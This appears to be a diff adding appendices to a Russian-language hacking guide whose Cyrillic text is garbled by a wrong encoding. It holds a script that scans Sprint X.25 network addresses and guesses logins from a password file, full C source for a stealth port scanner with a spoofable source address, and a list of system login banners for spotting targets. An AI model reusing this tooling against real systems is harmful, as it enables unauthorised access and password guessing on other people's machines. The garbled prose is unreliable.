+≥   ≥               0 - ‰„≠™Ê®Ô ‡•§†™‚®‡Æ¢†≠®Ô ¢  ™Æ¨†≠§≠Æ¨  ‡•¶®¨•  ≥
+≥   ≥                   Æ‚·„‚·‚¢„•‚                                  ≥
+≥   ≥               1 - ‡•§†™‚®‡Æ¢†≠®•  ¢  ™Æ¨†≠§≠Æ¨   ‡•¶®¨•   §´Ô  ≥
+≥   ≥                   ‚•‡¨®≠†´Æ¢ · °„¨†¶≠Æ© ´•≠‚Æ©                 ≥
+≥   ≥               2 - ‡•§†™‚®‡Æ¢†≠®• ¢ ™Æ¨†≠§≠Æ¨ ‡•¶®¨• §´Ô ¢®§•Æ- ≥
+≥   ≥                   ‚•‡¨®≠†´Æ¢                                   ≥
+√ƒƒƒ≈ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ¥
+≥20.≥ ¨†·™®‡Æ¢†≠®• ÌÂÆ                                               ≥
+≥   ≥               0 - ¨†·™®‡Æ¢†≠®• ÌÂÆ Æ‚·„‚·‚¢„•‚                 ≥
+≥   ≥               1 - ÌÂÆ ≠• ¢Î§†•‚·Ô ≠† CR                        ≥
+≥   ≥               2 - ÌÂÆ ≠• ¢Î§†•‚·Ô ≠† LF                        ≥
+≥   ≥              64 - ÌÂÆ  ≠•  ¢Î§†•‚·Ô  ≠†  ·®¨¢Æ´Î ÆØ‡•§•´Ô•¨Î•  ≥
+≥   ≥                   Ø†‡†¨•‚‡†¨® 16,17,18                         ≥
+≥   ≥             128 - ÌÂÆ ≠• ¢Î§†•‚·Ô ≠† ·®¨¢Æ´ DEL  ®  ¢·•  Æ·‚†- ≥
+≥   ≥                   ´Ï≠Î• „Ø‡†¢´ÔÓÈ®• ·®¨¢Æ´Î, ≠• „™†ß†≠≠Î• ¢ÎË• ≥
+√ƒƒƒ≈ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ¥
+≥21.≥ Ø‡Æ¢•‡™† Á•‚≠Æ·‚®                                              ≥
+≥   ≥               0 - èÄÑ Ø‡®≠®¨†•‚ §†≠≠Î• ¢ ‰Æ‡¨†‚• 8N            ≥
+≥   ≥               1 - èÄÑ  Ø‡®≠®¨†•‚  §†≠≠Î• ¢ ‰Æ‡¨†‚• 8N, Ø‡® Æ°- ≥
+≥   ≥                   ‡†°Æ‚™• ·‚†‡Ë®© °®‚ ≠• †≠†´®ß®‡„•‚·Ô         ≥
+≥   ≥               2 - èÄÑ Ø‡®≠®¨†•‚ §†≠≠Î• ¢ ‰Æ‡¨†‚• 7Ö1           ≥
+√ƒƒƒ≈ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ¥
+≥22.≥„Ø‡†¢´•≠®• ·‚‡†≠®Ê•©                                            ≥
+≥   ≥               0 - „Ø‡†¢´•≠®• ·‚‡†≠®Ê•© Æ‚·„‚·‚¢„•‚             ≥
+≥   ≥           1-255 - „·´Æ¢®• „Ø‡†¢´•≠®Ô ·‚‡†≠®Ê•© ØÆ·Î´†•‚·Ô  èÄÑ ≥
+≥   ≥                   ≠† ‚•‡¨®≠†´ ØÆ·´• „™†ß†≠≠Æ£Æ Á®·´† ·®¨¢Æ´Æ¢  ≥
+≥   ≥                   LF                                           ≥
+¿ƒƒƒ¡ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒŸ
+è‡®¨•Á†≠®•:
+  á≠†Á•≠®Ô Ø†‡†¨•‚‡Æ¢ ¨Æ£„‚ Ô¢´Ô‚Ï·Ô  ™Æ¨°®≠†Ê®•© (·„¨¨Æ©) ®ß ß≠†Á•≠®©
+  Ø‡®¢•§•≠≠ÎÂ ¢ ‚†°´®Ê•.
+---
+
+è‡®´Æ¶•≠®• 3. è‡®¨•‡ ·™‡®Ø‚† §´Ô ·™†≠®‡Æ¢†≠®Ô Sprint.
+
+--- begin sprint.scr ---
+;
+; ë™‡®Ø‚ §´Ô ·™†≠®‡Æ¢†≠®Ô Sprint by /DZh, 1996.
+; ëÆØ„‚·‚¢„ÓÈ®• ‰†©´Î :
+;    netfile - ç†Á†´Ï≠Î© †§‡•·
+;    success - è„·‚Æ© ‰†©´ §´Ô ß†Ø®·® ≠Æ¨•‡Æ¢ „§†Á≠ÎÂ ·Æ•§®≠•≠®©
+;    passwd  - ®≠‰Æ‡¨†Ê®Ô §´Ô ØÆ§°Æ‡† (Æ§≠Æ ·´Æ¢Æ - Æ§≠† ·‚‡Æ™†)
+;
+Integer netnumber, First
+String netstring, pswstring
+Open "netfile"
+Read netstring
+Atoi netstring, netnumber
+First = 0
+Print "Resuming from netnumber ",netnumber
+
+Procedure DialIt
+ hangup
+ delay 10
+ While not connected
+  dial "1"
+ EndWhile
+ put "^M"
+ waitfor "TERMINAL=",20
+ IF not found
+  dialit
+ EndIF
+ put "@D^M"
+EndPROC
+
+Procedure TryPass
+ open "passwd"
+ REPEAT
+  read pswstring
+  put pswstring
+  waitfor "sword",10
+  IF found
+   read pswstring
+   put pswstring
+  EndIF
+  waitfor "ogin:","UserID","sername","name?","name =>",8
+ UNTIL not found
+EndPROC
+
+Procedure TryHost
+ waitfor "[Y]/N)?","‚•™·‚ N >","Multi Host>","ogin:","UserID","sername","name?","name =>",10
+ SWITCH found
+  Case 0: delay 1
+          put "@^M"
+          waitfor "@",10
+          IF not found
+           DialIt
+          EndIF
+          put "BYE^M"
+  Case 1: put "^M"
+          TryHost
+  Case 2: put "N^M"
+          TryHost
+  Case 3: put "Q^M"
+          waitfor "@",10
+          IF not found
+           DialIt
+          EndIF
+  Case 4: TryPass
+  Case 5: TryPass
+  Case 6: TryPass
+  Case 7: TryPass
+  Case 8: TryPass
+ EndSWITCH
+EndPROC
+
+Procedure TryAddr
+ first=first+1
+ IF first > 100
+  script "rosnet.scr"
+ EndIF
+ While connected
+  create "netfile"
+  write netnumber
+  put netnumber
+  waitfor "DISCONNECTED","CONNECTED",10
+  SWITCH found
+   Case 0: delay 1
+           put "@^M"
+           waitfor "@",10
+           IF not found
+            DialIt
+           EndIF
+           put "BYE^M"
+   Case 1:
+   Case 2: append "success"
+           write netnumber
+           put ""
+           TryHost
+           put "STAT"
+           waitfor "NOT CONNECTED",3
+           IF not found
+            dialit
+           EndIF
+  EndSWITCH
+  netnumber=netnumber+1
+ EndWhile
+  dialit
+  TryAddr
+EndPROC
+
+logon
+dialit
+TryAddr
+logoff
+---
+
+è‡®´Æ¶•≠®• 4. è‡Æ£‡†¨¨† ·™†≠®‡Æ¢†≠®Ô TCP ØÆ‡‚Æ¢.
+
+--- begin resolve.c ---
+/*
+ * resolve.c
+ *           by Uriel Maimon (lifesux@cox.org)
+ */
+#include <sys/types.h>
+#include <string.h>
+#include <netdb.h>
+#include <stdio.h>
+#include <netinet/in.h>
+
+int resolve( const char *name, struct sockaddr_in *addr, int port )
+     {
+        struct hostent *host;
+
+        /* clear everything in case I forget something */
+        bzero(addr,sizeof(struct sockaddr_in));
+
+        if (( host = gethostbyname(name) ) == NULL )  {
+#ifndef RESOLVE_QUIET
+           fprintf(stderr,"unable to resolve host \"%s\" -- ",name);
+           perror("");
+#endif
+           return -1;
+        }
+
+        addr->sin_family = host->h_addrtype;
+        memcpy((caddr_t)&addr->sin_addr,host->h_addr,host->h_length);
+        addr->sin_port = htons(port);
+
+        return 0;
+     }
+
+int resolve_rns( char *name , unsigned long addr )
+     {
+        struct hostent *host;
+        unsigned long address;
+
+        address = addr;
+        host = gethostbyaddr((char *)&address,4,AF_INET);
+
+        if (!host)  {
+#ifndef RESOLVE_QUIET
+           fprintf(stderr,"unable to resolve host \"%s\" -- ",inet_ntoa(addr));
+           perror("");
+#endif
+           return -1;
+        }
+        strcpy(name,host->h_name);
+        return 0;
+     }
+
+unsigned long addr_to_ulong(struct sockaddr_in *addr)
+     {
+        return addr->sin_addr.s_addr;
+     }
+/*
+ * EOF
+ */
+--- begin tcp_pkt.c ---
+/*
+ * tcp_pkt.c
+ *           by Uriel Maimon (lifesux@cox.org)
+ */
+
+/* remove inlines for smaller size but lower speed */
+#include <netinet/in.h>
+#include <string.h>
+#include <sys/types.h>
+#include <netinet/ip.h>
+#include <netinet/tcp.h>
+
+#define IPHDRSIZE sizeof(struct iphdr)
+#define TCPHDRSIZE sizeof(struct tcphdr)
+#define PSEUDOHDRSIZE sizeof(struct pseudohdr)
+
+    /*
+     * in_cksum --
+     *  Checksum routine for Internet Protocol family headers (C Version)
+     */
+unsigned short in_cksum(addr, len)
+    u_short *addr;
+    int len;
+{
+    register int nleft = len;
+    register u_short *w = addr;
+    register int sum = 0;
+    u_short answer = 0;
+
+    /*
+     * Our algorithm is simple, using a 32 bit accumulator (sum), we add
+     * sequential 16 bit words to it, and at the end, fold back all the
+     * carry bits from the top 16 bits into the lower 16 bits.
+     */
+    while (nleft > 1)  {
+        sum += *w++;
+        nleft -= 2;
+    }
+
+    /* mop up an odd byte, if necessary */
+    if (nleft == 1) {
+        *(u_char *)(&answer) = *(u_char *)w ;
+        sum += answer;
+    }
+
+    /* add back carry outs from top 16 bits to low 16 bits */
+    sum = (sum >> 16) + (sum & 0xffff);   /* add hi 16 to low 16 */
+    sum += (sum >> 16);                   /* add carry */
+    answer = ~sum;                        /* truncate to 16 bits */
+    return(answer);
+}
+
+     /*
+      * HEXDUMP()
+      *
+      * not too much to explain
+      */
+inline void HEXDUMP(unsigned len, unsigned char *data)
+{
+   unsigned i;
+   for (i=0;i<len;i++) printf("%02X%c",*(data+i),((i+1)%16) ? ' ' : '\n');
+}
+
+     /*
+      * tcpip_send()
+      *
+      * sends a totally customized datagram with TCP/IP headers.
+      */
+inline int tcpip_send(int      socket,
+                      struct sockaddr_in *address,
+                      unsigned long s_addr,
+                      unsigned long t_addr,
+                      unsigned      s_port,
+                      unsigned      t_port,
+                      unsigned char tcpflags,
+                      unsigned long seq,
+                      unsigned long ack,
+                      unsigned      win,
+                      char          *datagram,
+                      unsigned      datasize)
+     {
+
+        struct pseudohdr  {
+           unsigned long saddr;
+           unsigned long daddr;
+           char useless;
+           unsigned char protocol;
+           unsigned int tcplength;
+        };
+
+        unsigned char packet[2048];
+        struct iphdr        *ip     = (struct iphdr *)packet;
+        struct tcphdr       *tcp    = (struct tcphdr *)(packet+IPHDRSIZE);
+        struct pseudohdr    *pseudo = (struct pseudohdr *)(packet+IPHDRSIZE-PSEUDOHDRSIZE);
+        unsigned char       *data   = (unsigned char *)(packet+IPHDRSIZE+TCPHDRSIZE);
+
+        /*
+         * The above casts will save us a lot of memcpy's later.
+         * The pseudo-header makes this way become easier than a union.
+         */
+
+        memcpy(data,datagram,datasize);
+        memset(packet,0,TCPHDRSIZE+IPHDRSIZE);
+
+        /* The data is in place, all headers are zeroed. */
+
+        pseudo->saddr = s_addr;
+        pseudo->daddr = t_addr;
+        pseudo->protocol = IPPROTO_TCP;
+        pseudo->tcplength = htons(TCPHDRSIZE+datasize);
+
+        /* The TCP pseudo-header was created. */
+
+        tcp->th_sport   = htons(s_port);
+        tcp->th_dport   = htons(t_port);
+        tcp->th_off     = 5;          /* 20 bytes, (no options) */
+        tcp->th_flags   = tcpflags;
+        tcp->th_seq     = htonl(seq);
+        tcp->th_ack     = htonl(ack);
+        tcp->th_win     = htons(win); /* we don't need any bigger, I guess. */
+
+        /* The necessary TCP header fields are set. */
+
+        tcp->th_sum = in_cksum(pseudo,PSEUDOHDRSIZE+TCPHDRSIZE+datasize);
+
+        memset(packet,0,IPHDRSIZE);
+        /* The pseudo-header is wiped to clear the IP header fields */
+
+        ip->saddr    = s_addr;
+        ip->daddr    = t_addr;
+        ip->version  = 4;
+        ip->ihl      = 5;
+        ip->ttl      = 255;
+        ip->id       = random()%1996;
+        ip->protocol = IPPROTO_TCP; /* should be 6 */
+        ip->tot_len  = htons(IPHDRSIZE + TCPHDRSIZE + datasize);
+        ip->check    = in_cksum((char *)packet,IPHDRSIZE);
+
+        /* The IP header is intact. The packet is ready. */
+
+#ifdef TCP_PKT_DEBUG
+        printf("Packet ready. Dump: \n");
+#ifdef TCP_PKT_DEBUG_DATA
+        HEXDUMP(IPHDRSIZE+TCPHDRSIZE+datasize,packet);
+#else
+        HEXDUMP(IPHDRSIZE+TCPHDRSIZE,packet);
+#endif
+        printf("\n");
+#endif
+
+        return sendto(socket, packet, IPHDRSIZE+TCPHDRSIZE+datasize, 0, (struct sockaddr *)address, sizeof(struct sockaddr));
+     }
+/*
+ * EOF
+ */
+--- begin scantcp.c ---
+/*
+ *  Port Scanning without the SYN flag / Uriel Maimon
+ *  (lifesux@cox.org)
+ */
+
+#define RESOLVE_QUIET
+
+#include <stdio.h>
+#include <netinet/in.h>
+#include <netinet/ip.h>
+#include <netinet/ip_tcp.h>
+#include <sys/time.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <string.h>
+#include <signal.h>
+#include <errno.h>
+
+#include "resolve.c"
+#include "tcp_pkt.c"
+
+#define STCP_VERSION "1.32"
+#define STCP_PORT  1234                /* Our local port. */
+#define STCP_SENDS 3
+#define STCP_THRESHOLD 8
+#define STCP_SLOWFACTOR 10
+
+void banner(void)
+     {
+        printf("\nscantcp\n");
+        printf("version %s\n",STCP_VERSION);
+     }
+
+void usage(const char *progname)
+     {
+        printf("\nusage: \n");
+        printf("%s <method> <source> <dest> <ports> <udelay> <delay> [sf]\n\n",progname);
+        printf("\t<method> : 0: half-open scanning (type 0, SYN)\n");
+        printf("\t           1: stealth scanning (type 1, FIN)\n");
+        printf("\t           2: stealth scanning (type 2, ACK)\n");
+        printf("\t<source> : source address (this host)\n");
+        printf("\t<dest>   : target to scan\n");
+        printf("\t<ports>  : ports/and or ranges to scan - eg: 21-30,113,6000\n");
+        printf("\t<udelay> : microseconds to wait between TCP sends\n");
+        printf("\t<delay>  : seconds to wait for TCP replies\n");
+        printf("\t[sf]     : slow-factor in case sends are dectected to be too fast\n\n");
+     }
+
+unsigned char *dest_name;
+unsigned char *spoof_name;
+struct sockaddr_in destaddr;
+unsigned long dest_addr;
+unsigned long spoof_addr;
+unsigned long usecdelay;
+unsigned      waitdelay;
+
+int slowfactor = STCP_SLOWFACTOR;
+
+struct portrec                         /* the port-data structure */
+{
+   unsigned           n;
+   int                state;
+   unsigned char      ttl;
+   unsigned short int window;
+   unsigned long int  seq;
+   char               sends;
+} *ports;
+
+char *portstr;
+unsigned char scanflags;
+int done;
+int rawsock;                           /* socket descriptors */
+int tcpsock;
+int lastidx = 0;                       /* last sent index */
+int maxports;                          /* total number of ports */
+
+void timeout(int signum)               /* timeout handler           */
+     {                                 /* this is actually the data */
+        int someopen = 0;              /* analyzer function. werd.  */
+        unsigned lastsent;
+        int checklowttl = 0;
+
+        struct portrec *p;
+
+        printf("* SCANNING IS OVER\n\n");
+        fflush(stdout);
+
+        done = 1;
+
+        for (lastsent = 0;lastsent<maxports;lastsent++)
+          {
+             p = ports+lastsent;
+             if (p->state == -1)
+               if (p->ttl > 64)
+               {
+                  checklowttl = 1;
+                  break;
+               }
+          }
+
+/* the above loop checks whether there's need to report low-ttl packets */
+
+        for (lastsent = 0;lastsent<maxports;lastsent++)
+          {
+             p = ports+lastsent;
+
+             destaddr.sin_port = htons(p->n);
+
+             tcpip_send(rawsock,&destaddr,
+                        spoof_addr,destaddr.sin_addr.s_addr,
+                        STCP_PORT,ntohs(destaddr.sin_port),
+                        TH_RST,
+                        p->seq++, 0,
+                        512,
+                        NULL,
+                        0);
+          }                            /* just RST -everything- sent   */
+                                       /* this inclued packets a reply */
+                                       /* (even RST) was recieved for  */
+        for (lastsent = 0;lastsent<maxports;lastsent++)
+          {                            /* here is the data analyzer */
+             p = ports+lastsent;
+             switch (scanflags)
+               {
+                case TH_SYN:
+                  switch(p->state)
+                    {
+                     case -1: break;
+                     case 1 : printf("# port %d is listening.\n",p->n);
+                       someopen++;
+                       break;
+                     case 2 : printf("# port %d maybe listening (unknown response).\n",
+                                     p->n);
+                       someopen++;
+                       break;
+                     default: printf("# port %d needs to be rescanned.\n",p->n);
+                    }
+                  break;
+                case TH_ACK:
+                  switch (p->state)
+                    {
+                     case -1:
+                       if (((p->ttl < 65) && checklowttl) || (p->window >0))
+                         {
+                            printf("# port %d maybe listening",p->n);
+                            if (p->ttl < 65) printf(" (low ttl)");
+                            if (p->window >0) printf(" (big window)");
+                            printf(".\n");
+                            someopen++;
+                         }
+                       break;
+                     case 1:
+                     case 2:
+                       printf("# port %d has an unexpected response.\n",
+                              p->n);
+                       break;
+                     default:
+                       printf("# port %d needs to be rescanned.\n",p->n);
+                    }
+                  break;
+                case TH_FIN:
+                  switch (p->state)
+                    {
+                     case -1: break;
+                     case 0 :
+                       printf("# port %d maybe open.\n",p->n);
+                       someopen++;
+                       break;
+                     default:
+                       printf("# port %d has an unexpected response.\n",p->n);
+                    }
+               }
+          }
+
+        printf("-----------------------------------------------\n");
+        printf("# total ports open or maybe open: %d\n\n",someopen);
+        free(ports);
+
+        exit(0);                       /* heh. */
+
+     }
+
+int resolve_one(const char *name, unsigned long *addr, const char *desc)
+     {
+        struct sockaddr_in tempaddr;
+        if (resolve(name, &tempaddr,0) == -1) {
+           printf("error: can't resolve the %s.\n",desc);
+           return -1;
+        }
+
+        *addr = tempaddr.sin_addr.s_addr;
+        return 0;
+     }
+
+void give_info(void)
+     {
+        printf("# response address           : %s (%s)\n",spoof_name,inet_ntoa(spoof_addr));
+        printf("# target address             : %s (%s)\n",dest_name,inet_ntoa(dest_addr));
+        printf("# ports                      : %s\n",portstr);
+        printf("# (total number of ports)    : %d\n",maxports);
+        printf("# delay between sends        : %lu microseconds\n",usecdelay);
+        printf("# delay                      : %u seconds\n",waitdelay);
+        printf("# flood dectection threshold : %d unanswered sends\n",STCP_THRESHOLD);
+        printf("# slow factor                : %d\n",slowfactor);
+        printf("# max sends per port         : %d\n\n",STCP_SENDS);
+     }
+
+int parse_args(int argc, char *argv[])
+{
+   if (strrchr(argv[0],'/') != NULL)
+     argv[0] = strrchr(argv[0],'/') + 1;
+
+   if (argc < 7)
+   {
+      printf("%s: not enough arguments\n",argv[0]);
+      return -1;
+   }
+
+   switch (atoi(argv[1]))
+   {
+      case 0  : scanflags = TH_SYN; break;
+      case 1  : scanflags = TH_FIN; break;
+      case 2  : scanflags = TH_ACK; break;
+      default : printf("%s: unknown scanning method\n",argv[0]);
+                return -1;
+   }
+   spoof_name = argv[2];
+   dest_name = argv[3];
+   portstr = argv[4];
+   usecdelay = atol(argv[5]);
+   waitdelay = atoi(argv[6]);
+   if (argc > 7) slowfactor = atoi(argv[7]);
+   if ((usecdelay == 0) && (slowfactor > 0))
+     {
+        printf("%s: adjusting microsecond-delay to 1usec.\n");
+        usecdelay++;
+     }
+   return 0;
+}
+
+int build_ports(char *str)       /* build the initial port-database */
+{
+   int i;
+   int n;
+   struct portrec *p;
+   int sport;
+   char *s;
+   s        = str;
+   maxports = 0;
+   n        = 0;
+
+   while (*s != '\0')
+     {
+        switch (*s)
+          {
+           case '0':
+           case '1':
+           case '2':
+           case '3':
+           case '4':
+           case '5':
+           case '6':
+           case '7':
+           case '8':
+           case '9':
+             n *= 10;
+             n += (*s - '0');
+             break;
+           case '-':
+             if (n == 0) return -1;
+             sport = n;
+             n = 0;
+             break;
+           case ',':
+             if (n == 0) return -1;
+             if (sport != 0)
+               {
+                  if (sport >= n) return -1;
+                  maxports += n-sport;
+                  sport = 0;
+               } else
+               maxports++;
+             n = 0;
+             break;
+          }
+        s++;
+     }
+   if (n == 0) return -1;
+   if (sport != 0)
+     {
+        if (sport >= n) return -1;
+        maxports += n-sport;
+        sport = 0;
+     }
+   else
+     maxports++;
+
+   maxports+=2;
+
+   if ((ports = (struct portrec *)malloc((maxports)*sizeof(struct portrec))) == NULL)
+     {
+        fprintf(stderr,"\nerror: not enough memory for port database\n\n");
+        exit(1);
+     }
+   s        = str;
+   maxports = 0;
+   n        = 0;
+
+   while (*s != '\0')
+     {
+        switch (*s)
+          {
+           case '0':
+           case '1':
+           case '2':
+           case '3':
+           case '4':
+           case '5':
+           case '6':
+           case '7':
+           case '8':
+           case '9':
+             n *= 10;
+             n += (*s - '0');
+             break;
+           case '-':
+             if (n == 0) return -1;
+             sport = n;
+             n = 0;
+             break;
+           case ',':
+             if (n == 0) return -1;
+             if (sport != 0)
+               {
+                  if (sport >= n) return -1;
+                  while (sport <= n)
+                    {
+                       for (i=0;i<maxports;i++)
+                         if ((ports+i)->n == sport) break;
+
+                       if (i < maxports-1 )
+                         printf("notice: duplicate port - %d\n",sport);
+                       else
+                         {
+                            (ports+maxports)->n = sport;
+                            maxports++;
+                         }
+                       sport++;
+                    }
+                  sport = 0;
+               } else
+               {
+                  for (i=0;i<maxports;i++)
+                    if ((ports+i)->n == n) break;
+
+                  if (i < maxports-1 )
+                    printf("notice: duplicate port - %d\n",n);
+                  else
+                    {
+                       (ports+maxports)->n = n;
+                       maxports++;
+                    }
+               }
+             n = 0;
+             break;
+          }
+        s++;
+     }
+
+   if (n == 0) return -1;
+   if (sport != 0)
+     {
+        if (sport >= n) return -1;
+        while (sport <= n)
+          {
+             for (i=0;i<maxports;i++)
+               if ((ports+i)->n == sport) break;
+
+             if (i < maxports-1 )
+               printf("notice: duplicate port - %d\n",sport);
+             else
+               {
+                  (ports+maxports)->n = sport;
+                  maxports++;
+               }
+             sport++;
+          }
+        sport = 0;
+     } else
+     {
+        for (i=0;i<maxports;i++)
+          if ((ports+i)->n == n) break;
+
+        if (i < maxports-1 )
+          printf("notice: duplicate port - %d\n",n);
+        else
+          {
+             (ports+maxports)->n = n;
+             maxports++;
+          }
+     }
+
+   printf("\n");
+
+   for (i=0;i<maxports;i++)
+     {
+        p        = ports+i;
+        p->state = 0;
+        p->sends = 0;
+     }
+
+   return 0;
+}
+
+struct portrec *portbynum(int num)
+{
+   int i = 0;
+   while ( ((ports+i)->n != num) && (i<maxports) ) i++;
+   if ( i == maxports ) return NULL;
+
+   return (ports+i);
+}
+
+struct portrec *nextport(char save)
+{
+   struct portrec *p = ports;
+   int doneports     = 0;
+
+   int oldlastidx = lastidx;
+
+   while (doneports != maxports)
+     {
+        p = ports+lastidx;
+        if ((p->state != 0) || (p->sends == STCP_SENDS))
+          {
+             doneports++;
+             lastidx++;
+             lastidx %= maxports;
+          }
+        else
+          break;
+     }
+
+   if (save)
+     lastidx = oldlastidx;
+   else
+     lastidx = (lastidx + 1) % maxports;
+
+   if (doneports == maxports) return NULL;
+
+   return p;
+}
+
+inline unsigned long usecdiff(struct timeval *a, struct timeval *b)
+{
+   unsigned long s;
+
+   s = b->tv_sec - a->tv_sec;
+   s *= 1000000;
+   s += b->tv_usec - a->tv_usec;
+
+   return s;                           /* return the stupid microsecond diff */
+}
+
+void main(int argc, char *argv[])
+{
+   int lastsent = 0;
+    char buf[3000];
+    struct iphdr  *ip   = (struct iphdr *)(buf);
+   struct tcphdr *tcp  = (struct tcphdr *)(buf+sizeof(struct iphdr));
+    struct sockaddr_in from;
+   int fromlen;
+    struct portrec *readport;
+    fd_set rset, wset;
+    struct timeval waitsend, now, del;
+    unsigned long udiff;
+    int sendthreshold = 0;
+
+   banner();
+
+   if (parse_args(argc,argv))
+     {
+        usage(argv[0]);
+        return;
+     }
+
+   if (resolve_one(dest_name,
+                    &dest_addr,
+                    "destination host")) exit(1);
+
+   destaddr.sin_addr.s_addr = dest_addr;
+   destaddr.sin_family = AF_INET;
+
+   if (resolve_one(spoof_name, &spoof_addr, "source host")) exit(1);
+
+   if ( build_ports(portstr) == -1)
+     {
+        printf("\n%s: bad port string\n",argv[0]);
+        usage(argv[0]);
+        return;
+     }
+
+   give_info();
+
+   if ((tcpsock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
+     {
+        printf("\nerror: couldn't get TCP raw socket\n\n");
+        exit(1);
+     }
+   if ((rawsock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1)
+     {
+        printf("\nerror: couldn't get raw socket\n\n");
+        exit(1);
+     }
+
+   /* well, let's get to it. */
+
+   done = 0;
+
+   printf("* BEGINNING SCAN\n");
+   fflush(stdout);
+
+   gettimeofday(&waitsend,NULL);
+
+   while (!done)
+     {
+        if (nextport(1) == NULL)
+          {
+             alarm(0);             /* no more sends, now we just  */
+             signal(SIGALRM,timeout); /* to wait <waitdelay> seconds */
+             alarm(waitdelay);        /* before resetting and giving */
+          }                           /* results.                    */
+
+        FD_ZERO(&rset);
+        FD_SET(tcpsock,&rset);
+
+        gettimeofday(&now,NULL);
+
+        udiff = usecdiff(&waitsend,&now);
+
+        /* here comes the multiple choice select().
+         * well, there are 3 states:
+         * 1. already sent all the packets.
+         * 2. didn't send all the packets, but it's not time for another send
+         * 3. didn't send all the packets and it is time for another send.
+         */
+
+        if (nextport(1) != NULL)
+          if (udiff > usecdelay)
+          {
+             FD_ZERO(&wset);
+             FD_SET(rawsock,&wset);
+             select(FD_SETSIZE,&rset,&wset,NULL,NULL);
+          } else
+          {
+             del.tv_sec = 0;
+             del.tv_usec = usecdelay;
+             select(FD_SETSIZE,&rset,NULL,NULL,&del);
+          }
+        else
+          select(FD_SETSIZE,&rset,NULL,NULL,NULL);
+
+        if (FD_ISSET(tcpsock,&rset))   /* process the reply */
+          {
+             fromlen = sizeof(from);
+
+             recvfrom(tcpsock,&buf,3000,0,
+                      (struct sockaddr *)&from,&fromlen);
+
+             if (from.sin_addr.s_addr == destaddr.sin_addr.s_addr)
+               if (ntohs(tcp->th_dport) == STCP_PORT)
+               {
+                  printf("* got reply");
+
+                  readport = portbynum(ntohs(tcp->th_sport));
+
+                  if (readport == NULL)
+                    printf(" -- bad port");
+                  else
+                    {
+                       sendthreshold = 0;
+                       if (!readport->state)
+                         {
+                            readport->ttl    = ip->ttl;
+                            readport->window = tcp->th_win;
+
+                            if (tcp->th_flags & TH_RST)
+                              {
+                                 readport->state = -1;
+                                 printf(" (RST)");
+                                 if (readport->ttl    < 65) printf(" (short ttl)");
+                                 if (readport->window > 0) printf(" (big window)");
+                              }
+                            else
+                              if (tcp->th_flags & (TH_ACK | TH_SYN))
+                              {
+                                 readport->state = 1;
+                                 printf(" (SYN+ACK)");
+                                 tcpip_send(rawsock,&destaddr,
+                                            spoof_addr,destaddr.sin_addr.s_addr,
+                                            STCP_PORT,readport->n,
+                                            TH_RST,
+                                            readport->seq++, 0,
+                                            512,
+                                            NULL,
+                                            0);
+                              }
+                            else
+                              {
+                                 readport->state = 2;
+                                 printf(" (UNEXPECTED)");
+                                 tcpip_send(rawsock,&destaddr,
+                                            spoof_addr,destaddr.sin_addr.s_addr,
+                                            STCP_PORT,readport->n,
+                                            TH_RST,
+                                            readport->seq++, 0,
+                                            512,
+                                            NULL,
+                                            0);
+                              }
+                         }
+                       else
+                         printf(" (duplicate)");
+                    }
+                  printf("\n");
+                  fflush(stdout);
+               }
+          }
+
+        if (nextport(1) != NULL)
+          if (FD_ISSET(rawsock,&wset)) /* process the sends */
+          {
+             readport = nextport(0);
+
+             destaddr.sin_port = htons(readport->n);
+
+             printf("* sending to port %d ",ntohs(destaddr.sin_port));
+
+             readport->seq = lrand48();
+             readport->sends++;
+
+             tcpip_send(rawsock,&destaddr,
+                        spoof_addr,destaddr.sin_addr.s_addr,
+                        STCP_PORT,ntohs(destaddr.sin_port),
+                        scanflags, readport->seq++, lrand48(),
+                        512, NULL, 0);
+
+             gettimeofday(&waitsend,NULL);
+
+             FD_ZERO(&wset);
+             printf("\n");
+
+             if ((++sendthreshold > STCP_THRESHOLD) && (slowfactor))
+               {
+                  printf("\n\n -- THRESHOLD CROSSED - SLOWING UP SENDS\n\n");
+                  usecdelay *= slowfactor;
+                  sendthreshold = 0;
+               }
+          }
+     }
+}
+/*
+ * EOF
+ */
+---
+
+è‡®´Æ¶•≠®• 5. ç•™Æ‚Æ‡Î• OS ® ®Â Ø‡®£´†Ë•≠®Ô.
+
+--- begin banners.txt ---
+
+èÆÁ‚® ¢·• UNIX
+~~~~~~~~~~~~~~
+[... ãÓ°Æ© ‚•™·‚ ...]
+login: root
+password:
+
+AS/400
+~~~~~~
+UserID?
+Password?
+
+CDC Cyber
+~~~~~~~~~
+FAMILY:
+USER NAME:
+
+PRIMOS
+~~~~~~
+PRIMENET 19.2.7F PPOA1
+[... ãÓ°Æ© ‚•™·‚ ...]
+
+ER!
+
+CISCO Router
+~~~~~~~~~~~~
+                 REMOTE Router -  TN043R1
+                      Console Port
+TN043R1>
+
+VM/370
+~~~~~~
+VM/370
+!
+
+
+DECserver
+~~~~~~~~~
+[... ãÓ°Æ© ‚•™·‚ ...]
+Please type HELP if you need assistance
+
+Enter username> TNO
+Local>
+
+
+Hewlett Packard MPE-XL ® §‡„£®• HP
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+:
+EXPECTED A :HELLO COMMAND. (CIERR 6057)
+:HELLO
+EXPECTED [SESSION NAME,] USER.ACCT [,GROUP]   (CIERR 1424)
+:
+
+GTN
+~~~
+WELCOME TO XXXXXXXXX. PLEASE SIGN ON.
+@
